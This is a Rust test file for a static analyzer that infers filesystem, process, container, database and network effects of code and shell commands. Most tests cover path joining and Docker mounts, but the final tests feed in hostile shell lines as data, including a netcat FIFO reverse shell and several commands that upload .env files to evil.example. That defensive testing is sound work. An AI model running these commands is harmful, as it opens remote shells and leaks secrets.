use effinterp_engine::Engine;
use effinterp_proto::{
    BoundaryClass, CausalReason, ContainerStorage, ExecutionAssurance, ExecutionRealm,
    OccurrenceKind, Port, ResourceExpr, ResourceIdentity, Subject, resource_domain, validate_plan,
};

fn analyze(subject: Subject) -> effinterp_proto::Plan {
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&subject)
        .unwrap();
    validate_plan(&plan).unwrap();
    plan
}

fn python(source: &str) -> effinterp_proto::Plan {
    analyze(Subject::Source {
        dialect: None,
        language: "python".into(),
        source: source.into(),
        cwd: Some("/work".into()),
        context: Default::default(),
    })
}

fn go(source: &str) -> effinterp_proto::Plan {
    analyze(Subject::Source {
        dialect: None,
        language: "go".into(),
        source: source.into(),
        cwd: Some("/work".into()),
        context: Default::default(),
    })
}

fn exec(argv: &[&str]) -> effinterp_proto::Plan {
    analyze(Subject::Exec {
        argv: argv.iter().map(|arg| (*arg).to_string()).collect(),
        cwd: Some("/work".into()),
        context: Default::default(),
    })
}

fn shell(source: &str) -> effinterp_proto::Plan {
    analyze(Subject::Shell {
        source: source.into(),
        cwd: Some("/work".into()),
        context: Default::default(),
    })
}

#[test]
fn filesystem_text_concatenation_preserves_bound_and_symbolic_fragments() {
    for (head, tail, expected) in [
        ("/home/u", "x", "/home/ux"),
        ("/home/u", "/x", "/home/u/x"),
        ("/home/u/", "x", "/home/u/x"),
        ("/home/u", ".tgz", "/home/u.tgz"),
        ("", "/x", "/x"),
        ("/", "x", "/x"),
        ("foo", "bar", "/work/foobar"),
        ("foo", "/x", "/work/foo/x"),
        ("/home/u", "/.cache/../x", "/home/u/x"),
    ] {
        for (language, sources) in [
            (
                "python",
                vec![
                    format!("h = {head:?}\nopen(h + {tail:?})"),
                    format!("def f(p):\n    open(p + {tail:?})\ndef g(q):\n    f(q)\ng({head:?})"),
                ],
            ),
            (
                "js",
                vec![
                    format!(
                        "const fs=require('fs');const h={head:?};fs.readFileSync(h + {tail:?});"
                    ),
                    format!(
                        "const fs=require('fs');function f(p){{fs.readFileSync(p + {tail:?});}}f({head:?});"
                    ),
                ],
            ),
            (
                "go",
                vec![
                    format!(
                        "package main\nimport \"os\"\nfunc main(){{h:={head:?};os.ReadFile(h + {tail:?})}}"
                    ),
                    format!(
                        "package main\nimport \"os\"\nfunc f(p string){{os.ReadFile(p + {tail:?})}}\nfunc main(){{f({head:?})}}"
                    ),
                ],
            ),
        ] {
            for source in sources {
                let plan = analyze(Subject::Source {
                    dialect: (language == "js").then_some(effinterp_proto::SourceDialect::Js),
                    language: language.into(),
                    source: source.clone(),
                    cwd: Some("/work".into()),
                    context: Default::default(),
                });
                let reads: Vec<_> = plan
                    .effects
                    .iter()
                    .filter(|effect| effect.operation.0 == "filesystem.read")
                    .collect();
                assert!(!reads.is_empty(), "{language}: {source}");
                assert!(
                    reads.iter().all(|effect| {
                        let resource = effinterp_engine::substitute_resource_expr(&effect.resource,
                            &std::collections::HashMap::from([("cwd".into(), ResourceExpr::Concrete {
                                identity: ResourceIdentity::FsPath { path: "/work".into() },
                            })]));
                        matches!(effinterp_proto::normalize_resource(resource, effinterp_proto::PathPlatform::Posix),
                            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                            if path == expected)
                    }),
                    "{language}: {source}: {reads:?}"
                );
            }
        }
    }
    for (language, source) in [
        ("python", "import os\nopen(os.environ['HOME'] + 'x')"),
        (
            "js",
            "const fs=require('fs');fs.readFileSync(process.env.HOME + 'x');",
        ),
        (
            "go",
            "package main\nimport \"os\"\nfunc main(){os.ReadFile(os.Getenv(\"HOME\") + \"x\")}",
        ),
    ] {
        let plan = analyze(Subject::Source {
            dialect: (language == "js").then_some(effinterp_proto::SourceDialect::Js),
            language: language.into(),
            source: source.into(),
            cwd: Some("/work".into()),
            context: Default::default(),
        });
        assert!(plan.effects.iter().any(|effect| effect.operation.0 == "filesystem.read"
            && matches!(&effect.resource, ResourceExpr::Join { parts }
                if parts.iter().any(|part| matches!(part, ResourceExpr::Environment { name } if name == "HOME"))
                && matches!(parts.last(), Some(ResourceExpr::Literal { value }) if value == "x"))),
            "{language}: {:?}", plan.effects);
    }
    // A known relative prefix must keep cwd even while the suffix is unbound.
    for head in ["rel/", "rel", "./rel/", "rel/../other/", "/absolute/"] {
        for (language, sources) in [
            (
                "python",
                vec![
                    format!("import os\nopen({head:?} + os.environ['X'])"),
                    format!("import os\np = {head:?} + os.environ['X']\nopen(p)"),
                    format!("import os\ndef f(p):\n    open({head:?} + p)\nf(os.environ['X'])"),
                ],
            ),
            (
                "js",
                vec![
                    format!("const fs=require('fs');fs.readFileSync({head:?} + process.env.X);"),
                    format!("const fs=require('fs');fs.readFileSync(`{head}${{process.env.X}}`);"),
                    format!(
                        "const fs=require('fs');function f(p){{fs.readFileSync({head:?} + p);}}f(process.env.X);"
                    ),
                ],
            ),
            (
                "go",
                vec![
                    format!(
                        "package main\nimport \"os\"\nfunc main(){{os.ReadFile({head:?} + os.Getenv(\"X\"))}}"
                    ),
                    format!(
                        "package main\nimport \"os\"\nfunc main(){{p:={head:?} + os.Getenv(\"X\");os.ReadFile(p)}}"
                    ),
                ],
            ),
        ] {
            for source in sources {
                for cwd in [Some("/work"), Some("/"), None] {
                    let plan = analyze(Subject::Source {
                        dialect: (language == "js").then_some(effinterp_proto::SourceDialect::Js),
                        language: language.into(),
                        source: source.clone(),
                        cwd: cwd.map(Into::into),
                        context: Default::default(),
                    });
                    let reads: Vec<_> = plan
                        .effects
                        .iter()
                        .filter(|effect| effect.operation.0 == "filesystem.read")
                        .collect();
                    assert!(!reads.is_empty(), "{language}: {source}");
                    for tail in ["file", "", "/file", "../file"] {
                        for effect in &reads {
                            let ResourceExpr::Join { parts } = &effect.resource else {
                                panic!("{language}: {source}: {:?}", effect.resource);
                            };
                            let parts: Vec<_> = parts
                                .iter()
                                .map(|part| match part {
                                    ResourceExpr::Environment { name } if name == "X" => {
                                        ResourceExpr::Literal { value: tail.into() }
                                    }
                                    ResourceExpr::Parameter { name } if name == "cwd" => {
                                        ResourceExpr::Literal {
                                            value: cwd.unwrap_or("/work").into(),
                                        }
                                    }
                                    part => part.clone(),
                                })
                                .collect();
                            let expected = if head.starts_with('/') {
                                format!("{head}{tail}")
                            } else {
                                format!("{}/{head}{tail}", cwd.unwrap_or("/work"))
                            };
                            assert_eq!(
                                effinterp_proto::fold_fs_join(
                                    &parts,
                                    effinterp_proto::PathPlatform::Posix
                                ),
                                Some(effinterp_proto::normalize_path(
                                    &expected,
                                    effinterp_proto::PathPlatform::Posix
                                )),
                                "{language}: {source}, cwd={cwd:?}, tail={tail:?}: {:?}",
                                effect.resource
                            );
                        }
                    }
                }
            }
        }
    }
    // A stored concatenation used inside another path must not inherit its own cwd.
    for (setup, operand, prefix) in [
        (
            r#"p := "rel/" + os.Getenv("X")"#,
            r#"filepath.Join("/base", p)"#,
            "/base/rel/",
        ),
        (
            "",
            r#"filepath.Join("/base", "rel/" + os.Getenv("X"))"#,
            "/base/rel/",
        ),
        (
            r#"p := "rel/" + os.Getenv("X")"#,
            r#"filepath.Join(os.Getenv("D"), p)"#,
            "/base/rel/",
        ),
        (
            r#"d := os.Getenv("D"); p := "rel/" + os.Getenv("X")"#,
            r#"d + "/" + p"#,
            "/base/rel/",
        ),
        (
            r#"p := "rel/" + os.Getenv("X"); q := p"#,
            r#""/base/" + (q)"#,
            "/base/rel/",
        ),
        (
            r#"p := "/abs/" + os.Getenv("X")"#,
            r#"filepath.Join("/base", p)"#,
            "/base/abs/",
        ),
    ] {
        for (call, operation) in [
            (format!("os.ReadFile({operand})"), "filesystem.read"),
            (
                format!(r#"os.WriteFile({operand}, []byte("data"), 0600)"#),
                "filesystem.write",
            ),
        ] {
            let source = format!(
                "package main\nimport (\"os\";\"path/filepath\")\nfunc main(){{{setup};{call}}}"
            );
            for cwd in [Some("/work"), Some("/"), None] {
                let plan = analyze(Subject::Source {
                    dialect: None,
                    language: "go".into(),
                    source: source.clone(),
                    cwd: cwd.map(Into::into),
                    context: Default::default(),
                });
                let effects: Vec<_> = plan
                    .effects
                    .iter()
                    .filter(|effect| effect.operation.0 == operation)
                    .collect();
                assert!(!effects.is_empty(), "{source}");
                for effect in effects {
                    let ResourceExpr::Join { parts } = &effect.resource else {
                        panic!("{source}: {:?}", effect.resource);
                    };
                    for tail in ["file", "", "/file", "../file"] {
                        let parts: Vec<_> = parts
                            .iter()
                            .map(|part| match part {
                                ResourceExpr::Environment { name } if name == "X" => {
                                    ResourceExpr::Literal { value: tail.into() }
                                }
                                ResourceExpr::Environment { name } if name == "D" => {
                                    ResourceExpr::Literal {
                                        value: "/base".into(),
                                    }
                                }
                                part => part.clone(),
                            })
                            .collect();
                        assert_eq!(
                            effinterp_proto::fold_fs_join(
                                &parts,
                                effinterp_proto::PathPlatform::Posix
                            ),
                            Some(effinterp_proto::normalize_path(
                                &format!("{prefix}{tail}"),
                                effinterp_proto::PathPlatform::Posix
                            )),
                            "{source}, cwd={cwd:?}, tail={tail:?}: {:?}",
                            effect.resource
                        );
                    }
                }
            }
        }
    }
}

#[test]
fn relative_file_survives_helper_return_and_call_substitution() {
    let plan = python(
        r#"
import os
def target(root):
    return os.path.join(root, "notes.txt")
path = target("data")
open(path)
"#,
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.read"
            && matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path }
                } if path == "/work/data/notes.txt"
            )
    }));
}

#[test]
fn equal_paths_in_unrelated_realms_are_not_aliased() {
    let plan = exec(&["docker", "run", "alpine", "rm", "/tmp/x"]);
    assert!(
        !plan
            .causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .edges
            .iter()
            .any(|edge| edge.reason == CausalReason::Alias)
    );
}

#[test]
fn wrapper_assembled_argv_is_specialized_before_exec() {
    let plan = python(
        r#"
import subprocess
def clean(root):
    subprocess.run(["rm", "-rf", root])
clean("/tmp/cache")
"#,
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "process.exec"
            && matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process { executable, argv, cwd: Some(_), .. }
                } if executable == "rm"
                    && matches!(argv.as_slice(), [
                        ResourceExpr::Literal { value: flag },
                        ResourceExpr::Literal { value: path }
                    ] if flag == "-rf" && path == "/tmp/cache")
            )
    }));
}

#[test]
fn summarized_subprocess_keeps_non_path_argv() {
    let plan = python(
        r#"
import subprocess
def fetch(url):
    subprocess.run(["curl", "-o", "/tmp/out", url])
fetch("https://example.com/a")
"#,
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "process.exec"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::Process { executable, argv, .. }
            } if executable == "curl"
                && matches!(argv.as_slice(), [
                    ResourceExpr::Literal { value: output_flag },
                    ResourceExpr::Literal { value: output },
                    ResourceExpr::Literal { value: url },
                ] if output_flag == "-o"
                    && output == "/tmp/out"
                    && url == "https://example.com/a"))
    }));
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0.starts_with("network.")),
        "bound URL argument is composed through the curl model"
    );
}

#[test]
fn summarized_subprocess_with_directory_argv0_stays_unresolved() {
    for program in ["/usr/bin/", "tools/"] {
        let plan = python(&format!(
            r#"
import subprocess
def run(arg):
    subprocess.run(["{program}", "-l", arg])
run("a")
"#,
        ));
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "process.exec"
                    && matches!(&effect.resource, ResourceExpr::Unresolved { family }
                    if family.0 == "process")
            }),
            "{program}"
        );
        assert!(
            plan.boundaries.iter().any(|boundary| {
                boundary.reason.as_str() == "unresolved_command"
                    && boundary.class == BoundaryClass::Unresolved
                    && boundary.detail.as_deref()
                        == Some("executable name is not statically resolvable")
            }),
            "{program}"
        );
    }
}

#[test]
fn dynamic_process_arguments_stay_unresolved_and_distinct_from_literal_question_marks() {
    let python_dynamic = python(
        r#"
import os
import subprocess
subprocess.run(["rm", os.environ["TARGET"]])
"#,
    );
    let go_dynamic = go(r#"
package main
import "os"
import "os/exec"
func main() {
    target := os.Getenv("TARGET")
    exec.Command("rm", target).Run()
}
"#);
    for plan in [&python_dynamic, &go_dynamic] {
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "process.exec"
                && matches!(&effect.resource, ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process { executable, argv, .. }
                } if executable == "rm"
                    && matches!(argv.as_slice(), [ResourceExpr::Unresolved { family }]
                        if family.0 == "process"))
        }));
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.delete"
                && matches!(&effect.resource, ResourceExpr::Unresolved { family }
                    if family.0 == "filesystem")
        }));
    }

    let literal = python("import subprocess\nsubprocess.run(['rm', '?'])\n");
    assert!(literal.effects.iter().any(|effect| {
        effect.operation.0 == "process.exec"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::Process { executable, argv, .. }
            } if executable == "rm"
                && matches!(argv.as_slice(), [ResourceExpr::Literal { value }]
                    if value == "?"))
    }));
}

#[test]
fn docker_mount_keeps_host_and_container_paths_and_realms_separate() {
    let plan = exec(&[
        "docker",
        "run",
        "-v",
        "./input:/data/input",
        "alpine",
        "rm",
        "/data/input",
    ]);
    let container = plan
        .effects
        .iter()
        .find_map(|effect| match &effect.resource {
            ResourceExpr::Concrete {
                identity: identity @ ResourceIdentity::Container { .. },
            } if effect.operation.0 == "container.run" => Some(identity),
            _ => None,
        })
        .unwrap();
    assert!(matches!(
        container,
        ResourceIdentity::Container { runtime, image: Some(image), storage, .. }
            if runtime == "docker" && image == "alpine" && matches!(
                storage.as_slice(),
                [ContainerStorage::BindMount {
                    host_path: ResourceExpr::Concrete {
                        identity: ResourceIdentity::FsPath { path: host }
                    },
                    container_path: ResourceExpr::Concrete {
                        identity: ResourceIdentity::FsPath { path: container }
                    },
                    read_only: false,
                }] if host == "/work/input" && container == "/data/input"
            )
    ));
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.write"
            && effect.realm == ExecutionRealm::Host
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if path == "/work/input")
    }));
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && matches!(&effect.realm, ExecutionRealm::Container { runtime, name }
                if runtime == "docker" && name == "alpine")
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if path == "/data/input")
    }));
    let resource_node = |realm: &ExecutionRealm, path: &str| {
        plan.causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .nodes
            .iter()
            .find(|node| {
                &node.realm == realm
                    && matches!(&node.occurrence, OccurrenceKind::ResourceInteraction {
                        resource: ResourceExpr::Concrete {
                            identity: ResourceIdentity::FsPath { path: resource_path }
                        },
                        ..
                    } if resource_path == path)
            })
            .unwrap()
            .id
            .clone()
    };
    let host = resource_node(&ExecutionRealm::Host, "/work/input");
    let guest = resource_node(
        &ExecutionRealm::Container {
            runtime: "docker".into(),
            name: "alpine".into(),
        },
        "/data/input",
    );
    assert!(
        plan.causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .edges
            .iter()
            .any(|edge| {
                edge.reason == CausalReason::Alias && edge.from == host && edge.to == guest
            })
    );
    assert!(
        plan.causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .edges
            .iter()
            .any(|edge| {
                edge.reason == CausalReason::Alias && edge.from == guest && edge.to == host
            })
    );
}

#[test]
fn read_only_bind_mounts_do_not_claim_host_writes() {
    for argv in [
        &["docker", "run", "-v", "/host:/data:ro", "alpine"][..],
        &["docker", "run", "-v", "/host:/data:ro,z", "alpine"][..],
        &["podman", "run", "-v", "/host:/data:Z,ro", "alpine"][..],
        &[
            "docker",
            "run",
            "--mount",
            "type=bind,source=/host,target=/data,readonly",
            "alpine",
        ][..],
        &[
            "docker",
            "run",
            "--mount",
            "type=bind,source=/host,target=/data,readonly=true",
            "alpine",
        ][..],
        &[
            "docker",
            "run",
            "--mount",
            "type=bind,source=/host,target=/data,ro=true",
            "alpine",
        ][..],
    ] {
        let plan = exec(argv);
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "container.run"
                && matches!(&effect.resource, ResourceExpr::Concrete {
                    identity: ResourceIdentity::Container { storage, .. }
                } if matches!(storage.as_slice(), [ContainerStorage::BindMount {
                    read_only: true,
                    ..
                }]))
        }));
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.read"
                && matches!(&effect.resource, ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path }
                } if path == "/host")
        }));
        assert!(!plan.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.write"
                && matches!(&effect.resource, ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path }
                } if path == "/host")
        }));
    }
}

#[test]
fn symbolic_docker_mount_preserves_both_structural_paths() {
    let plan = shell(r#"docker run -v "$HOST_DIR:/data/input" alpine"#);
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "container.run"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::Container { storage, .. }
            } if matches!(storage.as_slice(), [ContainerStorage::BindMount {
                host_path: ResourceExpr::Environment { name },
                container_path: ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path }
                },
                read_only: false,
            }] if name == "HOST_DIR" && path == "/data/input"))
    }));
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.write"
            && matches!(&effect.resource, ResourceExpr::Environment { name } if name == "HOST_DIR")
    }));
}

#[test]
fn symbolic_container_workdir_stays_symbolic_in_nodes_and_effects() {
    for source in [
        r#"docker run -w "$DIR" alpine rm a"#,
        r#"docker exec -w "$DIR" app rm a"#,
        r#"podman run --workdir="$DIR" alpine rm a"#,
    ] {
        let plan = shell(source);
        let execution = plan
            .execution_graph
            .nodes
            .iter()
            .find(|node| {
                matches!(node.argv.first(), Some(ResourceExpr::Literal { value }) if value == "rm")
            })
            .expect("container command execution");
        assert!(
            matches!(&execution.cwd, Some(ResourceExpr::Environment { name }) if name == "DIR"),
            "{source}: {:?}",
            execution.cwd
        );
        let deleted = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .expect("rm effect");
        assert!(
            matches!(&deleted.resource, ResourceExpr::Join { parts }
                if matches!(parts.as_slice(), [
                    ResourceExpr::Environment { name },
                    ResourceExpr::Concrete {
                        identity: ResourceIdentity::FsPath { path }
                    }
                ] if name == "DIR" && path == "a")),
            "{source}: {:?}",
            deleted.resource
        );
    }
}

#[test]
fn python_and_shell_environment_joins_have_the_same_filesystem_resource() {
    let python = python("import os\nos.remove(os.environ['DIR'] + '/build')");
    let shell = shell(r#"rm -rf "$DIR"/build"#);
    let deleted = |plan: &effinterp_proto::Plan| {
        plan.effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .expect("filesystem delete")
            .resource
            .clone()
    };
    let python_resource = deleted(&python);
    assert_eq!(python_resource, deleted(&shell));
    assert_eq!(resource_domain(&python_resource), Some("filesystem"));
}

#[test]
fn symbolic_environment_overrides_replace_inherited_values() {
    for source in [
        r#"env T=one env T=$X rm /a"#,
        r#"docker run -e T=one img docker run -e T=$X img2 rm /a"#,
        r#"podman run --env=T=one img podman run --env=T=$X img2 rm /a"#,
    ] {
        let plan = shell(source);
        let execution = plan
            .execution_graph
            .nodes
            .iter()
            .find(|node| {
                matches!(node.argv.first(), Some(ResourceExpr::Literal { value }) if value == "rm")
            })
            .expect("overridden command execution");
        assert!(
            matches!(execution.environment.get("T"),
                Some(Some(ResourceExpr::Environment { name })) if name == "X"),
            "{source}: {:?}",
            execution.environment
        );
    }
}

#[test]
fn symbolic_launch_targets_do_not_claim_exact_assurance() {
    for (source, assurance) in [
        (r#"$PROG /a"#, ExecutionAssurance::Heuristic),
        (r#"./bin/* /a"#, ExecutionAssurance::Alternatives),
        (r#"$(cat plan.txt) /a"#, ExecutionAssurance::Widened),
    ] {
        let plan = shell(source);
        let execution = plan
            .execution_graph
            .nodes
            .iter()
            .find(|node| node.assurance == assurance)
            .expect("symbolic command execution");
        let boundary = execution.boundary.expect("typed unresolved boundary");
        assert_eq!(
            plan.boundaries[boundary.0 as usize].reason.as_str(),
            "unresolved_command"
        );
        assert_eq!(
            plan.boundaries[boundary.0 as usize].class,
            BoundaryClass::Unresolved
        );
    }
}

#[test]
fn empty_docker_mount_components_are_ignored_without_invalid_resources() {
    for source in [
        r#"docker run -v ":$FOO" alpine"#,
        r#"docker run -v "$FOO:" alpine"#,
        r#"docker run -v "/h:" alpine"#,
        r#"docker run -v ":/c" alpine"#,
        r#"docker run -v ::: alpine"#,
        r#"docker run --mount type=bind,src=/h,dst= alpine"#,
        r#"docker run --mount type=bind,src=,dst=/d alpine"#,
        r#"docker run --mount type=volume,source=,target=/d alpine"#,
        r#"podman run -v ":$FOO" alpine"#,
    ] {
        let plan = shell(source);
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "container.run"
                    && matches!(&effect.resource, ResourceExpr::Concrete {
                    identity: ResourceIdentity::Container { storage, .. }
                } if storage.is_empty())
            }),
            "{source}"
        );
    }
}

#[test]
fn current_directory_docker_mount_keeps_a_nonempty_host_path() {
    let plan = exec(&["docker", "run", "-v", ".:/data", "alpine", "ls"]);
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "container.run"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::Container { storage, .. }
            } if matches!(storage.as_slice(), [ContainerStorage::BindMount {
                host_path: ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path: host }
                },
                container_path: ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path: container }
                },
                read_only: false,
            }] if host == "/work" && container == "/data"))
    }));
}

#[test]
fn container_runtime_path_aliases_share_resource_and_realm_identity() {
    let bare = exec(&["docker", "run", "alpine", "rm", "/tmp/x"]);
    let qualified = exec(&["/usr/bin/docker", "run", "alpine", "rm", "/tmp/x"]);
    let container_identity = |plan: &effinterp_proto::Plan| {
        plan.effects
            .iter()
            .find(|effect| effect.operation.0 == "container.run")
            .map(|effect| effect.resource.clone())
            .unwrap()
    };
    assert_eq!(container_identity(&bare), container_identity(&qualified));
    assert!(qualified.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && matches!(&effect.realm, ExecutionRealm::Container { runtime, .. }
                if runtime == "docker")
    }));
}

#[test]
fn all_slash_container_operands_remain_valid_exact_evidence() {
    for argv in [
        &["docker", "exec", "/", "ls"][..],
        &["docker", "exec", "//", "ls"][..],
        &["docker", "exec", "///", "ls"][..],
        &["podman", "exec", "/", "ls"][..],
        &["docker", "start", "/"][..],
        &["docker", "stop", "//"][..],
        &["docker", "rm", "/"][..],
    ] {
        let plan = exec(argv);
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0.starts_with("container.")
                    && matches!(&effect.resource, ResourceExpr::Concrete {
                    identity: ResourceIdentity::Container { name: Some(name), .. }
                } if !name.is_empty())
            }),
            "{argv:?}"
        );
    }
}

#[test]
fn connection_and_sql_identifier_form_a_fully_scoped_table() {
    let plan = exec(&[
        "psql",
        "postgresql://user@DB.EXAMPLE/app",
        "-c",
        "UPDATE audit.events SET seen=true",
    ]);
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "database.write"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::DatabaseTable {
                    server: Some(server),
                    database: Some(database),
                    schema: Some(schema),
                    table,
                }
            } if server == "db.example" && database == "app" && schema == "audit" && table == "events")
    }));
    let sql_input = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .nodes
        .iter()
        .find(|node| {
            matches!(
                node.occurrence,
                OccurrenceKind::Port {
                    port: Port::SqlInput
                }
            )
        })
        .unwrap();
    let table = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .nodes
        .iter()
        .find(|node| {
            matches!(
                &node.occurrence,
                OccurrenceKind::ResourceInteraction { operation, resource, .. }
                    if operation.0 == "database.write"
                        && matches!(resource, ResourceExpr::Concrete {
                            identity: ResourceIdentity::DatabaseTable { table, .. }
                        } if table == "events")
            )
        })
        .unwrap();
    assert!(
        plan.causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .edges
            .iter()
            .any(|edge| {
                edge.from == sql_input.id
                    && edge.to == table.id
                    && edge.reason == CausalReason::ValueDependency
            })
    );
}

#[test]
fn argument_substitution_preserves_text_and_path_fragments() {
    use effinterp_engine::{SemanticValue, lower_effect_value, substitute_value};
    use effinterp_proto::{PathPlatform, normalize_resource};
    let path = |path: &str| ResourceExpr::Concrete {
        identity: ResourceIdentity::FsPath { path: path.into() },
    };
    for (fragment, bound, expected) in [
        (
            path("/work/foo"),
            ResourceExpr::Literal {
                value: "bar".into(),
            },
            "/work/foobar",
        ),
        (
            path("/work/foo"),
            ResourceExpr::Literal { value: "".into() },
            "/work/foo",
        ),
        (path("/work/foo"), path("bar"), "/work/foo/bar"),
        (
            path("/work/foo/"),
            ResourceExpr::Literal {
                value: "bar".into(),
            },
            "/work/foo/bar",
        ),
    ] {
        let resource = ResourceExpr::Join {
            parts: vec![
                fragment,
                ResourceExpr::Parameter {
                    name: "name".into(),
                },
            ],
        };
        let mut effect = shell("cat /tmp/x")
            .effects
            .into_iter()
            .find(|effect| effect.operation.0 == "filesystem.read")
            .unwrap();
        let bindings = [("name".into(), SemanticValue::from(bound))]
            .into_iter()
            .collect();
        let value = substitute_value(
            &SemanticValue::from(resource),
            &bindings,
            effinterp_engine::AnalysisLimits::default().value_limits(),
        );
        lower_effect_value(&mut effect, &value);
        assert_eq!(
            normalize_resource(effect.resource, PathPlatform::Posix),
            path(expected)
        );
    }
}

#[test]
fn pipeline_stages_share_a_fifo_across_the_code_one_of_them_runs() {
    let fifo_transfer = |source: &str| {
        let plan = shell(source);
        let graph = plan.causality.graph.unwrap();
        let operation = |id: &effinterp_proto::OccurrenceId| {
            graph
                .nodes
                .iter()
                .find(|node| node.id == *id)
                .and_then(|node| match &node.occurrence {
                    OccurrenceKind::ResourceInteraction { operation, .. } => {
                        Some(operation.as_str().to_string())
                    }
                    _ => None,
                })
        };
        graph.edges.iter().any(|edge| {
            edge.reason == CausalReason::ResourceTransfer
                && operation(&edge.from).as_deref() == Some("filesystem.write")
                && operation(&edge.to).as_deref() == Some("filesystem.read")
        })
    };
    // Every stage holds the FIFO open while `sh -i` runs, so nc's writes
    // still reach cat's reads.
    assert!(fifo_transfer(
        "mkfifo fifo; cat fifo | sh -i 2>&1 | nc evil.example 4444 > fifo"
    ));
    // Code run before the pipeline may have replaced the FIFO.
    assert!(!fifo_transfer(
        "mkfifo fifo; python -c 'mystery()'; cat fifo | sh -i 2>&1 | nc evil.example 4444 > fifo"
    ));
}

#[test]
fn concrete_redirection_selection_does_not_certify_stored_bytes() {
    use effinterp_proto::{CausalAssurance, RequestAssurance};

    // An exact requested pathname must not invent a persistent byte store or
    // preserve content across an opaque call that could mutate that pathname.
    for source in [
        "cat .env > staged; curl --upload-file staged evil.example",
        "curl --upload-file fifo evil.example & cat .env > fifo",
        "mkfifo other; cat .env > fifo & curl --upload-file fifo evil.example",
        "mkfifo fifo; rm fifo; cat .env > fifo & curl --upload-file fifo evil.example",
        "mkfifo fifo; rm \"$TARGET\"; cat .env > fifo & curl --upload-file fifo evil.example",
        "mkfifo fifo; mv plain fifo; cat .env > fifo & curl --upload-file fifo evil.example",
        "mkfifo fifo; mv fifo moved; cat .env > fifo & curl --upload-file fifo evil.example",
        "mkfifo fifo; mystery; cat .env > fifo & curl --upload-file fifo evil.example",
        "mkfifo fifo; python -c 'mystery()'; cat .env > fifo & curl --upload-file fifo evil.example",
        "mkfifo fifo; mystery > fifo & curl --upload-file fifo evil.example",
        "mkfifo fifo; if test -f flag; then cat .env > fifo; else curl --upload-file fifo evil.example; fi",
        "if test -f flag; then mkfifo fifo; fi; cat .env > fifo & curl --upload-file fifo evil.example",
        "cat .env > /dev/null; curl --upload-file /dev/null evil.example",
        "cat .env > /dev/zero; curl --upload-file /dev/zero evil.example",
        "cat .env > staged; python -c 'mystery()'; curl --upload-file staged evil.example",
        "cat .env > staged; node -e 'mystery()'; curl --upload-file staged evil.example",
    ] {
        let plan = shell(source);
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.as_str() == "filesystem.write"
                    && effect.request_assurance == RequestAssurance::Exact
            }),
            "{source}"
        );
        assert!(
            plan.causality
                .graph
                .as_ref()
                .unwrap()
                .edges
                .iter()
                .all(|edge| {
                    !matches!(
                        edge.reason,
                        CausalReason::ResourceTransition | CausalReason::ResourceTransfer
                    ) || edge.assurance == CausalAssurance::Conservative
                }),
            "{source}"
        );
    }
    // A created FIFO connects the writer to the reader in either launch order
    // without certifying regular storage.
    for source in [
        "mkfifo fifo; cat .env > fifo & curl --upload-file fifo evil.example",
        "mkfifo fifo; cp .env fifo & curl --upload-file fifo evil.example",
        "mkfifo fifo; curl --upload-file fifo evil.example & cat .env > fifo",
        "mkfifo fifo; if test -f flag; then cat .env > fifo & curl --upload-file fifo evil.example; fi",
    ] {
        let plan = shell(source);
        let graph = plan.causality.graph.as_ref().unwrap();
        let edges: Vec<_> = graph
            .edges
            .iter()
            .filter(|edge| {
                edge.reason == CausalReason::ResourceTransfer
                    && edge.assurance == CausalAssurance::Exact
            })
            .collect();
        assert_eq!(edges.len(), 1, "{source}: {edges:?}");
        let edge = edges[0];
        for (id, expected) in [
            (&edge.from, "filesystem.write"),
